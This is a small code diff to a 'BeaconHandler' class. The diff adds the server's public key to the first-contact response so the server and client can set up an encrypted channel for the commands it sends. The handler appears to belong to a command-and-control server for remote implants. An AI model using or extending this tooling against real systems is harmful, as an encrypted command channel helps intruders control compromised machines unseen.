@@ -383,6 +383,24 @@ class BeaconHandler(BaseHandler):
         }
         response_data["r"] = rotation_info
         
+        # Add server's public key for first contact
+        # This enables secure key exchange using asymmetric encryption
+        if is_new_client:
+            # Try to get encryption service
+            encryption_service = None
+            if hasattr(self.server, 'encryption_service'):
+                encryption_service = self.server.encryption_service
+            
+            if encryption_service and hasattr(encryption_service, 'get_public_key_base64'):
+                try:
+                    public_key_b64 = encryption_service.get_public_key_base64()
+                    if public_key_b64:
+                        # Include public key in response - "pk" for public key
+                        response_data["pk"] = public_key_b64
+                        self.log_message(f"Included public key in first contact response for client {client_id}")
+                except Exception as e:
+                    self.log_message(f"Error including public key in response: {e}")
+        
         # For established clients with encryption, encrypt the commands
         if not is_new_client and commands:
             # Convert commands to JSON string for encryption
